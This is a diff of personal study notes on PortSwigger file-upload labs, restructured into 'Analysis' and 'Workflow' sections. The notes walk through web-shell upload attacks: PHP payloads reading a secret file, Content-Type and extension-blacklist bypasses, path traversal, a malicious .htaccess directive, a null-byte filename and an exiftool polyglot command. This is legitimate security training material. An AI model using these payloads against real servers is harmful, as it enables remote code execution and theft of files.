@@ -11,6 +11,7 @@ To solve the lab, upload a basic PHP web shell and use it to exfiltrate the cont
 
 You can log in to your own account using the following credentials: `wiener:peter`
 
+**Analysis:**
 1. While proxying traffic through Burp, log in to your account and notice the option for uploading an avatar image.
 2. Upload an arbitrary image, then return to your account page. Notice that a preview of your avatar is now displayed on the page.
 3. In Burp, go to **Proxy > HTTP history**. Click the filter bar to open the **HTTP history filter** window. Under **Filter by MIME type**, enable the **Images** checkbox, then apply your changes.
@@ -22,18 +23,15 @@ You can log in to your own account using the following credentials: `wiener:pet
     `GET /files/avatars/exploit.php HTTP/1.1`
 8. Send the request. Notice that the server has executed your script and returned its output (Carlos's secret) in the response.
 
-Analysis:
-
-- POST -> upload image
-- GET -> fetch image by the server (display)
-![[Pasted image 20241022170425.png]]
-![[Pasted image 20241022170441.png]]
-![[Pasted image 20241022170457.png]]
-
-- delete all the previous image content, change filename-->exploit.php and add the new exploit content (we could extract /etc/passwd)
-![[Pasted image 20241022170552.png]]
+**Workflow:**
+1. Upload an arbitrary image, then return to your account page. Notice that a preview of your avatar is now displayed on the page.In Burp, go to **Proxy > HTTP history**. Click the filter bar to open the **HTTP history filter** window. Under **Filter by MIME type**, enable the **Images** checkbox, then apply your changes. In the proxy history, notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater.
+	![[Pasted image 20241022170425.png]]
+	![[Pasted image 20241022170441.png]]
+2.  On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret file. Use the avatar upload function to upload your malicious PHP file. The message in the response confirms that this was uploaded successfully.
+	- delete all the previous image content, change filename-->exploit.php and add the new exploit content (we could extract /etc/passwd)
+	![[Pasted image 20241022170552.png]]
 - following the GET response pointing to our malicious file we see that our exploit is fetched .
-![[Pasted image 20241022170646.png]]
+	![[Pasted image 20241022170646.png]]
 
 # **2. Web shell upload via Content-Type restriction bypass**
 This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.
@@ -42,6 +40,7 @@ To solve the lab, upload a basic PHP web shell and use it to exfiltrate the cont
 
 You can log in to your own account using the following credentials: `wiener:peter`
 
+**Analysis**:
 1. Log in and upload an image as your avatar, then go back to your account page.
 2. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater.
 3. On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret. For example:
@@ -53,14 +52,16 @@ You can log in to your own account using the following credentials: `wiener:pet
 8. Switch to the other Repeater tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.php` and send the request. Observe that Carlos's secret was returned in the response.
 9. Submit the secret to solve the lab.
 
-Analysis:
-	![[Pasted image 20241022175941.png]]
+**Workflow**:
 	![[Pasted image 20241022175956.png]]
 	![[Pasted image 20241022180009.png]]
-
-![[Pasted image 20241022181134.png]]
-![[Pasted image 20241022181258.png]]
-![[Pasted image 20241022181459.png]]
+1. Log in and upload an image as your avatar, then go back to your account page. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater. On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret. For example:
+    `<?php echo file_get_contents('/home/carlos/secret'); ?>`
+2. Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload files with the MIME type `image/jpeg` or `image/png`.
+	![[Pasted image 20241022181134.png]]
+3. In the part of the message body related to your file, change the specified `Content-Type` to `image/jpeg`. Send the request. Observe that the response indicates that your file was successfully uploaded.
+	![[Pasted image 20241022181258.png]]
+	![[Pasted image 20241022181459.png]]
 
 # **3. Web shell upload via path traversal**
 This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a [secondary vulnerability](https://portswigger.net/web-security/file-path-traversal).
@@ -69,7 +70,7 @@ To solve the lab, upload a basic PHP web shell and use it to exfiltrate the cont
 
 You can log in to your own account using the following credentials: `wiener:peter`
 
-
+**Analysis**:
 1. Log in and upload an image as your avatar, then go back to your account page.
 2. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater.
 3. On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret. For example:
@@ -86,18 +87,19 @@ You can log in to your own account using the following credentials: `wiener:pet
 11. In the browser, go back to your account page.
 12. In Burp's proxy history, find the `GET /files/avatars/..%2fexploit.php` request. Observe that Carlos's secret was returned in the response. This indicates that the file was uploaded to a higher directory in the filesystem hierarchy (`/files`), and subsequently executed by the server. Note that this means you can also request this file using `GET /files/exploit.php`.
 
-Analysis:
+**Workflow**:
 	![[Pasted image 20241023010909.png]]
-
-![[Pasted image 20241023012327.png]]
-![[Pasted image 20241023012403.png]]
+1. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater. On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret. For example: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
+	Upload this script as your avatar. Notice that the website doesn't seem to prevent you from uploading PHP files. In Burp Repeater, go to the tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.php` and send the request. Observe that instead of executing the script and returning the output, the server has just returned the contents of the PHP file as plain text.
+	![[Pasted image 20241023012327.png]]
+	![[Pasted image 20241023012403.png]]
 - we have to upload our file to a higher directory where execution is NOT restricted 
-![[Pasted image 20241023012233.png]]
-![[Pasted image 20241023012634.png]]
+	![[Pasted image 20241023012233.png]]
+	![[Pasted image 20241023012634.png]]
 - obfuscate by URL encoding ../ or /
-![[Pasted image 20241023012730.png]]
-- now we have uploaded our file to a higher directory so we can modify our GET request to fetch data directly from there
-![[Pasted image 20241023013319.png]]
+	![[Pasted image 20241023012730.png]]
+- now that we uploaded the file into a higher directory so we can modify our GET request to fetch data directly from there
+	![[Pasted image 20241023013319.png]]
 
 # **4. Web shell upload via extension blacklist bypass**
 This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.
@@ -106,6 +108,7 @@ To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the co
 
 You can log in to your own account using the following credentials: `wiener:peter`
 
+**Analysis**:
 1. Log in and upload an image as your avatar, then go back to your account page.
 2. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater.
 3. On your system, create a file called `exploit.php` containing a script for fetching the contents of Carlos's secret. For example:
@@ -124,19 +127,23 @@ You can log in to your own account using the following credentials: `wiener:pet
 9. Change the value of the `filename` parameter from `exploit.php` to `exploit.l33t`. Send the request again and notice that the file was uploaded successfully.
 10. Switch to the other Repeater tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.l33t` and send the request. Observe that Carlos's secret was returned in the response. Thanks to our malicious `.htaccess` file, the `.l33t` file was executed as if it were a `.php` file.
 
-Analysis:
+**Workflow**:
+1. Log in and upload an image as your avatar, then go back to your account page. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater. On your system, create a file called `exploit.php` containing a script for fetching the contents of Carlos's secret. For example:
+    `<?php echo file_get_contents('/home/carlos/secret'); ?>`
+	Attempt to upload this script as your avatar. The response indicates that you are not allowed to upload files with a `.php` extension.
+	![[Pasted image 20241023215441.png]]
+		![[Pasted image 20241023215537.png]]	![[Pasted image 20241023215847.png]]
+2. In Burp Repeater, go to the tab for the `POST /my-account/avatar` request and find the part of the body that relates to your PHP file. Make the following changes:
+    - Change the value of the `filename` parameter to `.htaccess`.
+    - Change the value of the `Content-Type` header to `text/plain`.
+    - Replace the contents of the file (your PHP payload) with the following Apache directive:
+        `AddType application/x-httpd-php .l33t`
+	This maps an arbitrary extension (`.l33t`) to the executable MIME type `application/x-httpd-php`. As the server uses the `mod_php` module, it knows how to handle this already.
+	![[Pasted image 20241023220125.png]]
+3. Send the request and observe that the file was successfully uploaded. Use the back arrow in Burp Repeater to return to the original request for uploading your PHP exploit. Change the value of the `filename` parameter from `exploit.php` to `exploit.l33t`. Send the request again and notice that the file was uploaded successfully. Switch to the other Repeater tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.l33t` and send the request. Observe that Carlos's secret was returned in the response. Thanks to our malicious `.htaccess` file, the `.l33t` file was executed as if it were a `.php` file.
+	  ![[Pasted image 20241023220303.png]]
+		![[Pasted image 20241023220708.png]]
 
-![[Pasted image 20241023215441.png]]
-
-![[Pasted image 20241023215537.png]]
-			![[Pasted image 20241023215847.png]]
-
-This maps an arbitrary extension (`.l33t`) to the executable MIME type `application/x-httpd-php`. As the server uses the `mod_php` module, it knows how to handle this already.
-![[Pasted image 20241023220125.png]]
-
-uploading again our exploit but this time with .l33t extension 
-![[Pasted image 20241023220303.png]]
-![[Pasted image 20241023220708.png]]
 
 # **5. Web shell upload via obfuscated file extension**
 This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.
@@ -145,6 +152,7 @@ To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the co
 
 You can log in to your own account using the following credentials: `wiener:peter`
 
+**Analysis**:
 1. Log in and upload an image as your avatar, then go back to your account page.
 2. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater.
 3. On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret. For example:
@@ -156,19 +164,23 @@ You can log in to your own account using the following credentials: `wiener:pet
 7. Send the request and observe that the file was successfully uploaded. Notice that the message refers to the file as `exploit.php`, suggesting that the null byte and `.jpg` extension have been stripped.
 8. Switch to the other Repeater tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.php` and send the request. Observe that Carlos's secret was returned in the response.
 
-Analysis:
+**Workflow**:
 	![[Pasted image 20241024020239.png]]
 
-![[Pasted image 20241024020810.png]]
-![[Pasted image 20241024020906.png]]
-![[Pasted image 20241024021121.png]]
+1. Log in and upload an image as your avatar, then go back to your account page. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater. On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret. For example:
+    `<?php echo file_get_contents('/home/carlos/secret'); ?>`
+	![[Pasted image 20241024020810.png]]
+2. In Burp Repeater, go to the tab for the `POST /my-account/avatar` request and find the part of the body that relates to your PHP file. In the `Content-Disposition` header, change the value of the `filename` parameter to include a URL encoded null byte, followed by the `.jpg` extension: `filename="exploit.php%00.jpg"`
+    ![[Pasted image 20241024020906.png]]
+	![[Pasted image 20241024021121.png]]
+
 
 # **6. Remote code execution via polyglot web shell upload**
 This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.
 
 To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
 
-
+**Analysis**:
 1. On your system, create a file called `exploit.php` containing a script for fetching the contents of Carlos's secret. For example:
     `<?php echo file_get_contents('/home/carlos/secret'); ?>`
 2. Log in and attempt to upload the script as your avatar. Observe that the server successfully blocks you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.
@@ -180,12 +192,18 @@ To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the co
 5. In Burp's proxy history, find the `GET /files/avatars/polyglot.php` request. Use the message editor's search feature to find the `START` string somewhere within the binary image data in the response. Between this and the `END` string, you should see Carlos's secret, for example:
     `START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END`
 
-Analysis:
+**Workflow**:
+1. Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:
+    `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`
+    This adds your PHP payload to the image's `Comment` field, then saves the image with a `.php` extension.
+    
 	![[Pasted image 20241024022945.png]]
 	![[Pasted image 20241024022957.png]]
 	![[Pasted image 20241024023023.png]]
-![[Pasted image 20241024023230.png]]
-![[Pasted image 20241024023521.png]]
+2.  In Burp's proxy history, find the `GET /files/avatars/polyglot.php` request. Use the message editor's search feature to find the `START` string somewhere within the binary image data in the response. Between this and the `END` string, you should see Carlos's secret, for example: `START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END`
+    ![[Pasted image 20241024023230.png]]
+	![[Pasted image 20241024023521.png]]
+
 
 # **7. Web shell upload via race condition**
 This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.
